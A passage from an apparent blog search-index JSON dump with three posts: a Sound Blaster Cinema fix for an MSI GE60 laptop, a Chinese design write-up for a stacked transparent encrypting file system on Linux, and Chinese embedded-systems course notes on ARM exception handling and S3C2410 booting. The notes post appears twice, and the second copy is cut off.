Then rebooted and had ccleaner fix any registry errors. Reinstalled the drivers and SBC. Go into the programs folder here:\nC:\\Program Files (x86)\\Creative\\Sound Blaster Cinema\\Sound Blaster Cinema\nThen delete the SBCinema.exe.config file.   Now the SBC is fully functional on Windows 10 64 bit and hopefully it works for everyone else to!\n","date":1525780800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1525780800,"objectID":"53ad0143f252288e1cdaf33097be2510","permalink":"http://www.guozet.me/post/Some-issues-with-MSI-GE60-2PG/","publishdate":"2018-05-08T12:00:00Z","relpermalink":"/post/Some-issues-with-MSI-GE60-2PG/","section":"post","summary":"There are some issues when I used my MSI GE60 2PG.\n1. Sound Blaster Cinema 1 Potential fix on Windows 10 A way to get Sound Blaster Cinema 1 fully functional on windows 10 x64 bit.","tags":"Laptop","title":"Some issues when I used my MSI GE60 2PG","type":"post"},{"authors":null,"categories":"Linux","content":" 选题背景 现在人们对计算机系统安全问题考虑的越来越多，对计算机系统安全的要求也越来越严格，数据安全早已不在是军方和政府要害部门的特殊需求。现在，几乎所有的应用领域包括银行、电子交易、政府、互联网络、专用网络和企业内部网络都有数据安全的需求。与此同时个人计算机的数据泄密问题也日益突出。加密技术在现代计算机系统安全中扮演着越来越重要的角色。而加密文件系统是加密技术中比较成熟和通用的方式。\n需求分析 对几种现有典型加密文件系统分析，我们可以发现传统的加密文件系统都存在着不同程度的问题，主要集中在这几个方面：数据的保护不完全；性能低下；密钥管理机制不够完善；界面交互性差；透明度差。\n 针对用户：普通Ubuntu等Linux系统个人用户者 用户特点：对命令行操作并不是很熟悉  设计目标 集合需求分析，我们的设计目标是：\n 对系统的运算速度不能产生太大的影响； 整个加解密过程对用户而言是透明的，授权访问者可以很直观的读取文件明文，而非授权访问者读取到的都是已经加密过后的密文； 在相似的操作系统中能够很好的进行移植。  根据这些需求，并结合现有加密文件系统的分析，我们选用堆叠式文件系统的方式来实现。设计的系统框架如下:\n系统简介 系统的主体功能是通过堆叠式文件系统来实现本地数据的加解密工作，具体需要实现的有：\n 加密文件系统开发，以一个独立的内核模块进行部署； 用户操作界面的开发，对用户更友好； 用户认证机制和文件加密密码验证结合，提高安全性； 除了正文，也可以对文件名加密； 用户可以自由选择下层文件系统来存放加密文件。  系统框架 Read操作 当用户发起read操作，加密文件系统中相关函数就被VFS中的系统调用sys_read()调用来处理这一个请求，他必须首先调用下层文件系统的read()以读取加密过的文件数据，然后解密文件数据，最后将解密后的原数据返回给用户。\nwrite操作 用户进程的write()函数经过系统通用的VFS层，就转化成了系统调用sys_write()；VFS层的系统调用sys_write()函数再调用堆叠式加密文件系统中的encrypt_write()函数，然后compressfs_write()函数对上层用户空间传来的数据进行加密；之后再调用位于加密文件系统下层的具体文件系统中write()函数；将加密后的数据写入底层的具体文件系统当中去。\n文件系统详细结构图 秘钥管理 成果展示 工作流程 用户操作界面 用户加解密操作 文件挂载后的操作界面 技术难点 加密文件系统实现方式选择（三种选择）  基于应用层来实现文件的加解密； 修改现有文件系统来实现； 堆叠式文件系统。  综合用户需求我们选择的是第三种方案，用堆叠式文件系统来实现透明加密。\n加密位置的选择 加密文件系统实现的难点之一在于找到一个Linux核心代码中合适的位置进行加解密操作。加密位置选择得好，便于实现，而且对系统的性能影响要比较小。我们选择的原则就是尽可能的将加解密操作延后。对于写操作，只在实际写入磁盘的时候才进行加密，对于读操作，只有在接近送到用户空间的缓冲区的时候才进行解密，加密的位置要让数据在Buffer Cache中是以明文形式存在的，以便能够利用Linux的缓冲机制提高加密文件系统的性能。反之，假设我们在Linux Buffer Cache层以上进行加解密操作，这就意味着对于加密的文件，Buffer Cache中存在的是密文，每次内核需要Buffer Cache中的内容的时候都要先进行加解密的工作，这将会大大的降低系统的性能。\n交互式脚本书写 如何书写与文件系统运行时候的交互式脚本，实现加密文件系统的自动化挂载过程。\nQT与Shell脚本交互 如何将QT图形界面获取到的参数传递给脚本，并启动脚本，如何返回脚本的执行情况给图形化界面。\n","date":1525698267,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1525698267,"objectID":"fb51403e55cbe9d3171cdcf8d396c747","permalink":"http://www.guozet.me/post/Design-and-Implementation-of-Transparent-Encrypted-File-System-Based-on-Linux/","publishdate":"2018-05-07T13:04:27Z","relpermalink":"/post/Design-and-Implementation-of-Transparent-Encrypted-File-System-Based-on-Linux/","section":"post","summary":"选题背景 现在人们对计算机系统安全问题考虑的越来越多，对计算机","tags":"Linux kernel","title":"基于Linux透明加密文件系统的设计与实现","type":"post"},{"authors":null,"categories":"Linux","content":"《嵌入式系统设计》概述\n前言 这是《嵌入式系统设计》这本书籍的内容小结，主要介绍了嵌入式系统架构中的系统部分。\n书籍内容小结摘要 分为两个部分介绍：\n 嵌入式系统设计部分：ARM架构部分 嵌入式系统设计部分   嵌入式系统的定义 以应用为中心、以计算机技术为基础、软硬件可裁剪、适应应用系统对功能、可靠性、成本、体积、功耗严格要求的专用计算机系统。“嵌入”、“专用”、“计算机”\n嵌入式系统的软、硬件组成？以及主要特点？  软件：从底层到上层：bootloader等系统初始化引导程序、设备驱动层（包括驱动程序、板级支持包BSP等）、操作系统、用户应用程序。（底层为上层提供服务） 开发软件：即集成开发环境（asemmbler\u0026amp;\u0026amp;compiler\u0026amp;\u0026amp;linker\u0026amp;\u0026amp;debugger\u0026amp;\u0026amp;loader） 硬件组成：核心板+外围板+外设(核心板：微控制器（CPU和外设接口、外设控制器）、电源、时钟、复位、SDRAM、flash。外围板面向外围设备，一般是引脚的集合、电平转换电路。外围设备。)，当然也可以将核心板和外围板放在一起。 硬件特点：通常由嵌入式处理器和嵌入式外围设备组成，高度集成，常采用SOC设计方法，对功耗、体积等有严格要求，定制性决定了它的可裁剪性，没有像计算机领域的垄断，解决方案不唯一。 软件特点：采用交叉开发方式，系统软件层次分明，操作系统为用户程序提供标准API，提供图形接口和文件系统。用户调用系统服务，系统调用设备驱动从而操纵硬件。  嵌入式系统产品设计的基本流程？   需求分析：\n 功能性需求是系统的基本功能，如输入输出信号、操作方式等； 非功能性需求包括系统性能、成本、功耗、体积、重量等因素。    规格说明：精确地反映客户的需求并且作为设计时必须明确遵循的要求。\n  体系结构设计：描述系统如何实现所述的功能和非功能需求，包括对硬件、软件和执行装置的功能划分以及系统的软件、硬件选型等。\n  软硬件设计：基于体系结构，对系统的软件、硬件进行详细设计。\n  系统集成：把系统的软件、硬件和执行装置集成在一起，进行调试，发现并改进单元设计过程中的错误。\n  系统测试：对设计好的系统进行测试，看其是否满足规格说明书中给定的功能要求。\n  处理器及操作系统的选型主要考虑哪些方面？  操作系统本身所提供的开发工具。 操作系统向硬件接口移植难度。 操作系统的内存要求。 开发人员是否熟悉此操作系统及其提供的系统API。 操作系统是否提供硬件的驱动程序，如网卡驱动程序等。 操作系统的是否具有可剪裁性。 操作系统是否具有实时性能。  交叉开发、交叉开发环境？为何需要交叉开发环境？ 交叉开发是指在一台通用计算机（宿主机）上进行软件的编辑编译，然后下载到嵌入式设备（目标机）中运行调试的开发方式\n交叉开发环境一般由运行于宿主机上的交叉开发软件（assembler\u0026amp;\u0026amp;compiler\u0026amp;\u0026amp;linker\u0026amp;\u0026amp;debugger\u0026amp;\u0026amp;loader）、宿主机到目标机的调试通道组成\n需要交叉开发环境是因为目标机一般对体积、功耗等有严格限制，资源也面向应用，较为紧张，要求仅仅能流畅运行代码即可，而将用户开发软件（包括各种库、工具）放置在主机上，而且现在的集成开发环境提供了各种修改好的功能库，用起来也方便。\n嵌入式集成开发环境的主要功能？ 这是由其组成决定的。Assembler将.c源代码汇编，compiler形成目标文件，linker根据链接描述文件将各个目标代码链接定位生成可执行代码。Debugger有些交叉开发工具提供了仿真调试通道。Loader可以将目标文件烧录进设备中（有时需要内部引导代码的配合）\n嵌入式Linux 开发主要流程？ 搭建开发环境–烧写bootloader–烧写内核–烧写根文件系统–烧写应用程序。\n  开发环境：REDHAT－LINUX、下载相应的GCC 交叉编译器进行安装、配置开发主机（配置MINICOM和配置网络，MINICOM 软件的作用是作为调试嵌入式开发板信息输出的监视器和键盘输入的工具，配置网络主要是配置IP地址、NFS网络文件系统，需要关闭防火墙）\n  烧写bootloader：下载一些公开源代码的BOOTLOADER根据自己具体芯片进行移植修改。 注：下载时，有些芯片没有内置引导装载程序，比如三星的ARM7、ARM9系列芯片，这样就需要编写烧写开发板上flash 的烧写程序。或者网络上有免费下载的WINDOWS 下通过JTAG 并口简易仿真器烧写ARM 外围flash芯片的程序。也有LINUX 下公开源代码的J-FLASH 程序。\n  下载内核：如果有专门针对你所使用的CPU 移植好的LINUX 操作系统那是再好不过，下载后再添加自己的特定硬件的驱动程序，进行调试修改。\n  下载根文件系统：从www.busybox.net 下载使用BUSYBOX软件进行功能裁减，产生一个最基本的根文件系统。根文件系统在嵌入式系统中一般设为只读，需要使用mkcramfs、genromfs 等工具产生烧写映象文件。\n  文件系统就是把你硬盘上数据按照一定格式组织成一棵树。数据块对应名称。删了它就相当于把硬盘格式化了。根文件系统就是出了内核以外，所有的系统文件存储的地方。之所以成为根，是因为有根才能成生长成树，是其它文件的最终挂载点。我们要明白根文件系统和内核是完全独立的两个部分，它是内核启动时所mount的第一个文件系统，里面有内核启动所必须的数据，不然就退出启动文件系统这种机制有利于用户和操作系统的交互。数据块对应名称。尽管内核是Linux 的核心，但文件却是用户与操作系统交互所采用的主要工具，尤其是LINUX。\n下载用户程序:可以下载到根文件系统中，有的应用程序不使用根文件系统，而是直接将应用程序和内核设计在一起，这有点类似于UCOS-II的方式。\n嵌入式Linux 开发环境中配置NFS服务的目的？ 可以使不同机器、不同操作系统之间通过网络共享文件，像访问本地文件一样访问远端系统上的文件，在开发阶段，主机制作基于NFS的文件系统，制定开放目录，开放对象的IP范围，将目录挂载到嵌入式设备后，嵌入式设备可以方便地访问、修改主机主机文件。\n什么是硬件重定向？ 上课的老师举得printf（）是个很好的例子，重定向程序是面向编译环境中的连接器的，是用户自己定义的C库函数，有了它，在程序连接时连接器会连接用户自己编写的C库中的功能函数而不是标准C库。相当于将标准C库进行了一次移植。从主机环境到实际运行环境的移植。\n比如：本来库函数fputc()是把字符输出到调试器控制窗口中去的,但用户把输出设备改成了UART端口,这样一来,所有基于fputc()函数的printf()系列函数输出都被重定向到UART端口上去了。相当于实现类似的功能，但是底层的驱动变了。\n ARM体系结构部分 ARM硬件电路最小系统组成？  微控制器（例如2410，CPU+外设接口/外设控制器）电源、时钟、复位、存储器（SDRAM/FLASH（NOR8位、NAND8 16 32位）） FLASH：存放操作系统、用户程序等需要掉电后保存的数据 SDRAM：系统运行的主要区域，系统及用户数据及堆栈，都在这个区域。有时启动模式选择 有时需要JTAG：对芯片内所有部件进行访问，通过该接口对系统调试、编程  ARM处理器的主要工作模式？ ARM的7种处理器模式（不同的模式下有自己的行为准则）\n USR；正常程序执行模式 FIQ；支持高速数据传送和通道处理 IRQ；用于通用中断的处理。 管理（SVC）；操作系统保护模式 中止 未定义 系统  除了USR之外，其它6种又称为特权模式。6中种除了系统模式又称为异常模式（即处理异常时的工作模式）。\n在软件控制下可以改变模式（即改变CPSR相应），外部中断或异常处理也引起模式变化，用户模式下不能改变模式。\n核心寄存器的作用： R13通常用作堆栈指针，称为SP，被初始化为多个模式下的堆栈。R14用作子程序连接寄存器LR，中断异常或执行BL时得到PC即R15的备份。\nCpsr程序状态寄存器，32位只用12位，所有模式下均可见。\nSpsr保存程序状态寄存器，即发生异常时对CPSR进行保存，保存当前状态。5个异常模式下均有各自的SPSR。\nARM处理器的启动过程？ 首先，看一下，ARM启动时的硬件机制，上电产生复位异常，CPU强制PC为0x00000000，执行复位异常处理函数，接下来就相当于执行了STRARTUP.S的功能。是给用户程序执行给以合适的工作环境，设置中断向量表、堆栈、时钟、完成内存拷贝等，相当于STARTUP.S或者bootloader的前端代码，是开机执行的程序。.拿2410的启动代码举例，它启动CPU的过程是：\n在起始地址分配中断向量表即中断处理函数（CPU要求的），以为向量空间只有4字节，所以一般只是一个跳转指令，去别处执行。在跳到复位异常之后，关闭中断，关闭看门狗。\n 之后初始化存储器系统 初始多个模式下的堆栈（模式切换时，硬件给SP置位） 初始化有特殊要求的外围设备，如LED灯、看门狗 初始化用户的执行环境（在FLASH中运行太慢了，把代码整体搬迁到RAM中） 切换处理器的工作模式 调用主程序 异常处理  当正常的程序执行流程发生暂时的停止时，称之为异常。对异常的处理有优先级，处理异常需要跳转至异常模式。并根据异常向量跳转至响应的子程序（执行之前必须保存现场），即异常出现后强制跳转至固定的存储器地址执行。异常是比中断更大的概念。\n异常处理 ARM有7种异常。包括:\n 复位 管理模式 0x00000000 软中断SWI 管理模式 0x00000008 IRQ IRQ模式 0x00000018 FIQ FIQ模式 0x0000001c 还包括预取中止、数据中止、未定义  异常出现时，异常模式分组的R14和SPSR用于保存下一条程序地址和CPSR。异常返回时，SPSR-\u0026gt;CPSR，R14-\u0026gt;PC\n在启动代码中首先就是设置所谓的异常向量表，也就是在指定的位置放置异常处理程序（一般是跳转指令）。异常发生时，CPU会根据规定强制置PC，恰好去执行我们设置好的跳转指令，接着执行服务程序。\n异常处理流程：（硬件机制，只做这些，跟代码无关）  根据异常类型，强制设置CPSR的运行模式位 在切换到的异常模式下，在当前的链接寄存器LR(r14)中保存上个模式的PC值-4，以便程序在处理异常返回时能从正确的位置重新开始执行 将上一个模式的CPSR复制到当前异常模式的SPSR中（注意1与2、3的矛盾，不能独立执行，但是是硬件实现的，无关代码） 强制PC。然后就到了执行代码的时候从相关的异常向量地址取下一条指令执行，从而跳转到相应的异常处理程序处。  异常返回流程：（有指令）  将LR寄存器中的值减去相应的偏移量(对于IRQ/FIQ是4)送到PC中 将 SPSR 复制回 CPSR（注意1与2的矛盾，不能独立执行，用一条带∧的指令执行，怎么着都是一条） 清除禁止中断标志,如果它被设置成使能 所有修改过的用户寄存器必须从处理程序的保护堆栈中恢复（即出栈）。  对中断嵌套的处理(注意)：\n保存在LR中的PC值，和该值返回时的处理过程。 当IRQ异常中断产生时，程序计数器pc的值已经更新，它指向当前指令后面第3条指令（对于ARM指令，它指向当前指令地址加12字节的位置；当IRQ异常中断产生时，处理器将值（pc-4）保存到IRQ异常模式下的寄存器lr_irq中，它指向当前指令之后的第2条指令，因此返回操作可以通过下面指令实现：subs pc, lr, \\#4\n有两种返回机制：\n当返回地址保存在当前异常模式的r14时使用其中一种机制 当返回地址保存在堆栈时使用另一种机制（进中断的时候保存的）。 访问机制 SUBS PC,R14_fiq ,\\#4 （不同模式有不同的指令，返回PC的同时返回CPSR，一条指令实现）\nSUB LR,LR,\\#4`` STMFD R13!，{R0，R4-R12，LR}  将寄存器列表中的寄存器R0，R4到R12，LR存入堆栈。\nLDMFD R13!,{R0，R4-R12，PC} ∧  将堆栈内容恢复到寄存器R0，R4到R12，PC，同时SPSR复制到CPSR。{∧}为可选后缀，当指令为LDM且寄存器列表中包含R15，选用该后缀时表示：除了正常的数据传送之外，还将SPSR复制到CPSR，一条指令实现。\n代码指令分析：\nAREA Init，CODE，READONLY；代码段Init、只读 …… CODE32 ；32位ARM指令集 LDR R0，＝NEXT＋1 ；给R0赋地址值 BX R0 ；程序跳，并将处理器切换到Thumb工作状态 …… CODE16 ； 16位thumb指令集 NEXT LDR R3，＝0x3FF 给R3赋值 …… END  高级语言和汇编语言函数间的相互调用: 汇编调用C：\nIMPORT Main ;通知编译器该标号为一个外部标号 AREA Init,CODE,READONLY ；定义一个代码段 ENTRY ；定义程序的入口点 LDR R0,=0x3FF0000 ；初始化系统配置寄存器 LDR R1,=0xE7FFFF80 STR R1,[R0] LDR SP,=0x3FE1000 ；初始化用户堆栈 BL Main ；**跳转到Main（）函数处的C/C++代码执行** END ；**标识汇编程序的结束** 以上的程序段完成一些简单的初始化，然后跳转到Main（）函数所标识的C/C ＋＋代码处执行主要的任务，此处的Main仅为一个标号，也可使用其他名称。 AREA Init , CODE , READONLY ;已定义代码段 ENTRY；程序入口 LDR R0, =0x3ff5000；R0赋寄存器地址值 LDR R1, 0x；要给寄存器赋的值 STR R1,[R0]；赋值 LDR R0, =0x3ff5008 LDR R1, 0x01 STR R1,[R0]；给另一个寄存器赋值的过程 BL PROC；跳转至标号为PROC的程序出执行 : : : : PROC : : MOV PC, LR //将LR保存的程序指针返回，即**跳到BL下一句接着执行** : : END   ARM 2410设计相关 CPU、外设、外设控制器、时序、寄存器的相互关系？ CPU与外设控制器构成微处理器，微处理器在核心板（最小系统）上发挥作用，将引脚集合成外设接口加上电平转换等就是外围板，外设通过外围板连接至外设控制器。CPU通过寄存器编程控制外设控制器产生时序控制外设。若是没有外设控制器，则需要CPU自己产生时序来与外设交互，这种时序相当于一种约定好的意思表示，相当于“语言”或者“通信协议”，\n例如：若是2410与一个带有IIC接口的器件通信，只需要连接起来，对IIC进行寄存器编程，控制它们之间的工作模式，可能收发数据就变成了在中断中读写寄存器操作，屏蔽了IIC规定的通信细节。若是51单片机要与IIC通信的话，就复杂多了，首先要仔细阅读IIC的协议，不容丝毫差错，然后用IO口模拟时序，CPU的工作量很大。\n寄存器编程的本质？如何获取寄存器的配置？ 寄存器编程的本质是CPU控制外设寄存器工作模式的方法。可以想象寄存器的每一位肯定是外设控制器功能模块中的一个个“开关”，给某一位赋值0或者1，就相当于使能或关闭某一个功能。\n2410最小电路设计？（晶振选择、启动选择、数据宽度） 与一般的ARM系统相同，都需要微处理器、电源、晶振、复位、存储器（flash、SDRAM）、JTAG接口等，具体情况如下：（需要对OM0和OM1配置电平以决定启动方式，对OM2和OM3配置电平以决定时钟源。）\n 电源设计：处理器用1.8V，RTC给时钟模块供电1.8V，存储器和普通IO用3.3V，ADC模块用3.3V，可见最小系统最少要用3.3和1.8两种直流稳压。课程实验中电源电压5V，分别用LM1085稳压3.3V，用AS1117稳压1.8V。 晶振设计: 2410的时钟控制逻辑可以产生系统所需要的时钟，包括CPU的FCLK，和AHB总线的HCLK，APB的PCLK。内部有两个锁相环PLL，MPLL提供前三个，UPLL给USB提供48MHZ的时钟。 主时钟源（UPLL和MPLL的时钟源）可以选择是来自外部时钟还是外部晶振，这是由OM2和OM3的管脚确定的，可以OM2和OM3同时接低电平，选择外部晶振，晶振加上15pF起振电容（经过锁相环倍频可以达到）。 复位电路设计:可以在nRESET端设计像51单片机那样的阻容复位电路，但为了稳定，可以使用复位芯片如MAX811或IMP811。 JTAG接口设计: 有20针和14针两种JTAG接口。 存储器设计: 2410有自己的存储器控制器，并且规定了哪些bank空间是RAM哪些是FLASH，存储器芯片严格按照DATASHEET上的要求和标明的引脚连接方式与存储器控制器的存储器接口相连就可以，控制器会根据地址产生读写存储器芯片的时序，完成存取数据的操作。  2410nor和nand启动过程分析？ NOR flash:读取速度高、而擦写速度低，容量小，价格高，地址线和数据线分开，采用SRAM接口。 NAND flash:读速度不如NORflash 但是擦写速度高，容量大，价格低，有取代硬盘的趋势，但是地址线和数据复用，需要程序配合才能读写数据。可以通过跳线设置时从NAND FLASH启动还是从NOR FLASH启动。\n NAND启动的优势：便宜、容量大。但是读写逻辑不能用硬件产生，也就是没办法接到BANK空间里，必须有程序配合才能读写（有专门的控制器接口，肯定要寄存器编程加上程序配合才能读写，没有PC的根正苗红），所以理论上它是不可以用来启动系统的，因为那之前什么程序都没有，要想读写它必须是系统装载完了而且有程序了。但是三星采用了SRAM映射解决了这个问题，下面就是这个过程：\n 电路中使OM1和OM0都接低电平，从NAND FLASH中启动。（2410有NAND FLASH控制器，连接NAND Flash芯片，产生读写时序）\n在该模式下，2410的前4KB地址空间对应一个名字叫做“起步石”的SRAM，系统启动时，自动将NAND FLASH的前4KB数据加载到起步石中，然后系统自动执行这些启动引导代码，CPU从内部RAM的0x00000000位置开始启动。这个过程不需要程序干涉。也就是类似于STARTUP.S的功能，初始化异常向量表、堆栈、将NAND FLASH中的代码(有代码支持喽)拷贝到SDRAM中运行。\nNOR FLASH 采用的的是SRAM接口，可以直接到存储器控制器上，ARM内核产生的时序能对其读写。将bank0上接上NORflash芯片。上电产生复位异常后会自动从NOR flash中启动。\n2410的中断处理流程？ 首先应该明确2410与ARM内核的异常处理系统的角色，根据之前的ARM异常处理流程，我们清楚明了了哪些是CPU的硬件机制。2410通过中断控制器允许以优先级的方式将几十个中断源共同用一个IRQ。一个中断申请提出后，IRQ异常发生，切换模式、保存CPSR、保存PC，然后跳转到handleIRQ函数，然后跳转到ISRIRQ(这只是一个大概流程，也许会定义更多的跳转)根据中断源向量表的首地址和偏移量寄存器找出到底是哪个中断发生了。然后跳转到相应的中断处理函数，比如跳到串口中断，还可以根据挂起位（即中断标志位）再次判断到底是接收中断还是发送完成中断。也就是说2410处理流程除了ARM对异常的响应是硬件机制外，其余的都是代码实现的。我们在编程的时候没有写的话，那也是编译器加进去的。\n2410对嵌套的处理 比起2410的处理流程不同的是，因为有了中断控制器，这就是实现高优先级嵌套的硬件基础，因为每一次进入异常模式用户都会保存环境，这就是中断嵌套的软件基础。CPU的异常处理机制总是那些，很明确的。我正在执行一个中断服务程序，然后再次发生异常，保存，跳转（CPU）、再次判断是哪个中断，进去之后压栈，运行另一个中断的服务程序，运行完返回，这是就是返回到上一个中断了。上一个中断运行完，一返回就是返回发生异常前的状态。\nS3C2410的串口、端口、外部中断、AD等及寄存器的编程能力（会读datasheet、会编程、作业、实验的相关代码） 寄存器的赋值指令\nLDR R0，=GPHCON LDR R1,=0X2AFAAA STR R1，[R0]  时钟、看门狗的相关概念  时钟: 整个系统提供同步脉冲，像人的脉搏一样。 看门狗：其实是一个计数器，当它计数溢出的时候，会使系统复位，所以它的作用是防止系统死机。打开看门狗之后，当代码跑飞或者陷入死循环之后，就不能喂狗，也就是不能清除计数值，那么它就会使系统重启。 VIVI  什么是bootloader Bootloader，为引导加载程序，是嵌入式系统加电后运行的第一段代码，相当于PC机的BIOS。 Bootloader在系统中的位置： 通常固化在硬件上的某个固态存储设备上，加电后自启动。\nBootloader功能： 初始化，给CPU合适的工作环境（相当于STARTUP.S），以便为最终调用操作系统内核或用户应用程序境。加载内核，下载内核或者根文件系统。\nBootloader操作模式 有启动加载和下载两种模式。\n 启动加载模式是Bootloader的正常工作模式，在嵌入式产品发布的时侯，Bootloader必须工作在这种模式下。即初始化CPU的工作环境之后，将内核如RAM执行。 下载模式：目标机上的Bootloader将通过串口连接或网络连接等通信手段从主机下载文件。主要是下载内核映像和根文件系统映像等。从主机下载的文件通常首先被Bootloader保存到目标机的RAM中，然后再被Bootloader写到目标机上的FLASH类固态存储设备中。Bootloader的这种模式通常在第一次安装内核与根文件系统时被使用；此外，以后的系统更新也会使用到这种工作模式。  Bootloader启动过程 上电之后，先启动CPU即执行startup.s类似功能代码（配置中断、初始化堆栈、拷贝代码等），然后进行加载内核的准备至少初始化一个串口，以便向终端用户反馈数据。检测系统内存映射，哪些是可用的RAM？在这一步之后，将检测外部按键，有按键按下将进入下载模式，没有按键的话将执行下面的步骤，加载内核：\n 将kenel和根文件系统从flash调入RAM 为内核启动设置参数 调用内核。  ","date":1470056667,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1470056667,"objectID":"9422ce250458909ca296253c177da62a","permalink":"http://www.guozet.me/post/Linux-Embedded-System-Design/","publishdate":"2016-08-01T13:04:27Z","relpermalink":"/post/Linux-Embedded-System-Design/","section":"post","summary":"《嵌入式系统设计》概述 前言 这是《嵌入式系统设计》这本书籍的内","tags":"Linux kernel","title":"嵌入式系统设计课程","type":"post"},{"authors":null,"categories":"Linux","content":"《嵌入式系统设计》概述\n前言 这是《嵌入式系统设计》这本书籍的内容小结，主要介绍了嵌入式系统架构中的系统部分。\n书籍内容小结摘要 分为两个部分介绍：\n 嵌入式系统设计部分：ARM架构部分 嵌入式系统设计部分   嵌入式系统的定义 以应用为中心、以计算机技术为基础、软硬件可裁剪、适应应用系统对功能、可靠性、成本、体积、功耗严格要求的专用计算机系统。“嵌入”、“专用”、“计算机”\n嵌入式系统的软、硬件组成？以及主要特点？  软件：从底层到上层：bootloader等系统初始化引导程序、设备驱动层（包括驱动程序、板级支持包BSP等）、操作系统、用户应用程序。（底层为上层提供服务） 开发软件：即集成开发环境（asemmbler\u0026amp;\u0026amp;compiler\u0026amp;\u0026amp;linker\u0026amp;\u0026amp;debugger\u0026amp;\u0026amp;loader） 硬件组成：核心板+外围板+外设(核心板：微控制器（CPU和外设接口、外设控制器）、电源、时钟、复位、SDRAM、flash。外围板面向外围设备，一般是引脚的集合、电平转换电路。外围设备。)，当然也可以将核心板和外围板放在一起。 硬件特点：通常由嵌入式处理器和嵌入式外围设备组成，高度集成，常采用SOC设计方法，对功耗、体积等有严格要求，定制性决定了它的可裁剪性，没有像计算机领域的垄断，解决方案不唯一。 软件特点：采用交叉开发方式，系统软件层次分明，操作系统为用户程序提供标准API，提供图形接口和文件系统。用户调用系统服务，系统调用设备驱动从而操纵硬件。  嵌入式系统产品设计的基本流程？   需求分析：\n 功能性需求是系统的基本功能，如输入输出信号、操作方式等； 非功能性需求包括系统性能、成本、功耗、体积、重量等因素。    规格说明：精确地反映客户的需求并且作为设计时必须明确遵循的要求。\n  体系结构设计：描述系统如何实现所述的功能和非功能需求，包括对硬件、软件和执行装置的功能划分以及系统的软件、硬件选型等。\n  软硬件设计：基于体系结构，对系统的软件、硬件进行详细设计。\n  系统集成：把系统的软件、硬件和执行装置集成在一起，进行调试，发现并改进单元设计过程中的错误。\n  系统测试：对设计好的系统进行测试，看其是否满足规格说明书中给定的功能要求。\n  处理器及操作系统的选型主要考虑哪些方面？  操作系统本身所提供的开发工具。 操作系统向硬件接口移植难度。 操作系统的内存要求。 开发人员是否熟悉此操作系统及其提供的系统API。 操作系统是否提供硬件的驱动程序，如网卡驱动程序等。 操作系统的是否具有可剪裁性。 操作系统是否具有实时性能。  交叉开发、交叉开发环境？为何需要交叉开发环境？ 交叉开发是指在一台通用计算机（宿主机）上进行软件的编辑编译，然后下载到嵌入式设备（目标机）中运行调试的开发方式\n交叉开发环境一般由运行于宿主机上的交叉开发软件（assembler\u0026amp;\u0026amp;compiler\u0026amp;\u0026amp;linker\u0026amp;\u0026amp;debugger\u0026amp;\u0026amp;loader）、宿主机到目标机的调试通道组成\n需要交叉开发环境是因为目标机一般对体积、功耗等有严格限制，资源也面向应用，较为紧张，要求仅仅能流畅运行代码即可，而将用户开发软件（包括各种库、工具）放置在主机上，而且现在的集成开发环境提供了各种修改好的功能库，用起来也方便。\n嵌入式集成开发环境的主要功能？ 这是由其组成决定的。Assembler将.c源代码汇编，compiler形成目标文件，linker根据链接描述文件将各个目标代码链接定位生成可执行代码。Debugger有些交叉开发工具提供了仿真调试通道。Loader可以将目标文件烧录进设备中（有时需要内部引导代码的配合）\n嵌入式Linux 开发主要流程？ 搭建开发环境–烧写bootloader–烧写内核–烧写根文件系统–烧写应用程序。\n  开发环境：REDHAT－LINUX、下载相应的GCC 交叉编译器进行安装、配置开发主机（配置MINICOM和配置网络，MINICOM 软件的作用是作为调试嵌入式开发板信息输出的监视器和键盘输入的工具，配置网络主要是配置IP地址、NFS网络文件系统，需要关闭防火墙）\n  烧写bootloader：下载一些公开源代码的BOOTLOADER根据自己具体芯片进行移植修改。 注：下载时，有些芯片没有内置引导装载程序，比如三星的ARM7、ARM9系列芯片，这样就需要编写烧写开发板上flash 的烧写程序。或者网络上有免费下载的WINDOWS 下通过JTAG 并口简易仿真器烧写ARM 外围flash芯片的程序。也有LINUX 下公开源代码的J-FLASH 程序。\n  下载内核：如果有专门针对你所使用的CPU 移植好的LINUX 操作系统那是再好不过，下载后再添加自己的特定硬件的驱动程序，进行调试修改。\n  下载根文件系统：从www.busybox.net 下载使用BUSYBOX软件进行功能裁减，产生一个最基本的根文件系统。根文件系统在嵌入式系统中一般设为只读，需要使用mkcramfs、genromfs 等工具产生烧写映象文件。\n  文件系统就是把你硬盘上数据按照一定格式组织成一棵树。数据块对应名称。删了它就相当于把硬盘格式化了。根文件系统就是出了内核以外，所有的系统文件存储的地方。之所以成为根，是因为有根才能成生长成树，是其它文件的最终挂载点。我们要明白根文件系统和内核是完全独立的两个部分，它是内核启动时所mount的第一个文件系统，里面有内核启动所必须的数据，不然就退出启动文件系统这种机制有利于用户和操作系统的交互。数据块对应名称。尽管内核是Linux 的核心，但文件却是用户与操作系统交互所采用的主要工具，尤其是LINUX。\n下载用户程序:可以下载到根文件系统中，有的应用程序不使用根文件系统，而是直接将应用程序和内核设计在一起，这有点类似于UCOS-II的方式。\n嵌入式Linux 开发环境中配置NFS服务的目的？ 可以使不同机器、不同操作系统之间通过网络共享文件，像访问本地文件一样访问远端系统上的文件，在开发阶段，主机制作基于NFS的文件系统，制定开放目录，开放对象的IP范围，将目录挂载到嵌入式设备后，嵌入式设备可以方便地访问、修改主机主机文件。\n什么是硬件重定向？ 上课的老师举得printf（）是个很好的例子，重定向程序是面向编译环境中的连接器的，是用户自己定义的C库函数，有了它，在程序连接时连接器会连接用户自己编写的C库中的功能函数而不是标准C库。相当于将标准C库进行了一次移植。从主机环境到实际运行环境的移植。\n比如：本来库函数fputc()是把字符输出到调试器控制窗口中去的,但用户把输出设备改成了UART端口,这样一来,所有基于fputc()函数的printf()系列函数输出都被重定向到UART端口上去了。相当于实现类似的功能，但是底层的驱动变了。\n ARM体系结构部分 ARM硬件电路最小系统组成？  微控制器（例如2410，CPU+外设接口/外设控制器）电源、时钟、复位、存储器（SDRAM/FLASH（NOR8位、NAND8 16 32位）） FLASH：存放操作系统、用户程序等需要掉电后保存的数据 SDRAM：系统运行的主要区域，系统及用户数据及堆栈，都在这个区域。有时启动模式选择 有时需要JTAG：对芯片内所有部件进行访问，通过该接口对系统调试、编程  ARM处理器的主要工作模式？ ARM的7种处理器模式（不同的模式下有自己的行为准则）\n USR；正常程序执行模式 FIQ；支持高速数据传送和通道处理 